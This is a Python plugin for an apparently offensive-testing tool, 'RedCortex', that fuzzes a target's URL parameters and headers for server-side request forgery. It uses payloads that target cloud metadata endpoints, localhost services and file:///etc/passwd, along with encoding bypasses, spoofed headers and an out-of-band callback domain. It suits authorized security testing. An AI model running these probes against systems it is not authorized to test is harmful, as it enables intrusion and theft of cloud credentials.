"""
RedCortex Plugin: Advanced SSRF Detector
- Async param/header/payload brute fuzzing
- Internal, cloud, localhost, OOB DNS/HTTP callback endpoint coverage
- Tamper encodings, header/redirect techniques, reflection checks
- Auto-risk scoring: instance/cloud leaks, root/local meta, auth, DNS hit
- Ready JSON output for reporting/automation
"""

import asyncio
import httpx
import uuid
import random
import re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
]
SSRF_PARAMS = [
    "url", "target", "link", "dest", "image", "img", "redirect", "file", "data", "host", "uri", "website", "site"
]
REALISTIC_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://localhost:80/",
    "http://127.0.0.1:22/",
    "http://0.0.0.0:8080/",
    "http://internal/api",
    "http://admin:admin@localhost:8080/",
    "http://[::1]/",
    "http://169.254.169.254/",
    "http://aws.amazon.com/",
    "http://windows.local/",
    "http://metadata.google.internal/",
    "file:///etc/passwd"
]
FAKE_OOB_DOMAIN = "ssrf-demo.com"

def random_oob():
    return f"http://{uuid.uuid4().hex}.{FAKE_OOB_DOMAIN}/"

TAMPERS = [
    lambda x: x,
    lambda x: x.replace("http://", "http:\\\\/\\\\/"),
    lambda x: x.replace("http://", "https://"),
    lambda x: x.replace("metadata.google.internal", "metadata.google.internal%00.example.com"),
    lambda x: x.replace("/", "\\/"),
    lambda x: x.replace("169.254.169.254", "0xA9FEA9FE"), # hex
    lambda x: x + "%0a"
]
SSRF_HEADERS = [
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;host=internal"},
    {"X-Host": "127.0.0.1"},
    {"Referer": "http://localhost"},
    {"Host": "internal"}
]
EVIDENCE_PATTERNS = [
    r"instance[-_]id", r"ami[-_]id", r"unauthorized", r"metadata", r"root:x", r"admin", r"cloud", r"localhost", r"internal",
    r"google", r"amazon", r"windows", r"127\.0\.0\.1", r"169\.254\.169\.254"
]

async def scan_ssrf(client, url, param, payload, headers):
    params = {param: payload}
    headers = {**headers, "User-Agent": random.choice(USER_AGENTS)}
    try:
        resp = await client.get(url, params=params, headers=headers, timeout=10)
        code, body = resp.status_code, resp.text
        for pat in EVIDENCE_PATTERNS:
            if re.search(pat, body, re.IGNORECASE):
                return {
                    "type": "SSRF",
                    "param": param,
                    "payload": payload,
                    "headers": headers,
                    "evidence": pat,
                    "severity": "critical",
                    "url": str(resp.url),
                    "proof_excerpt": body[:120]
                }
        # OOB callback: log the payload for manual DNS/HTTP out-of-band confirmation (requires Burp/interactsh/collaborator)
        if FAKE_OOB_DOMAIN in payload:
            return {
                "type": "SSRF-OOB",
                "param": param,
                "payload": payload,
                "headers": headers,
                "severity": "critical",
                "url": str(resp.url),
                "proof": "Check DNS/HTTP callback logs for OOB proof"
            }
    except Exception:
        pass
    return None

async def advanced_ssrf_scan(url):
    findings = []
    concurrency = 8
    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        tasks = []
        all_payloads = REALISTIC_PAYLOADS + [random_oob()]
        for param in SSRF_PARAMS:
            for tamper in TAMPERS:
                for payload in all_payloads:
                    for head in SSRF_HEADERS:
                        tasks.append(scan_ssrf(client, url, param, tamper(payload), head))
                    if len(tasks) >= concurrency:
                        results = await asyncio.gather(*tasks)
                        findings.extend([f for f in results if f])
                        tasks = []
        if tasks:
            results = await asyncio.gather(*tasks)
            findings.extend([f for f in results if f])
    return findings

def run(response, url, **kwargs):
    """
    RedCortex plugin interface. Async SSRF brute fuzzing, OOB support, full report.
    """
    try:
        return asyncio.run(advanced_ssrf_scan(url))
    except KeyboardInterrupt:
        return []

# Example usage
# findings = run(None, "https://vulnerable.site/page")
# for finding in findings: print(finding)
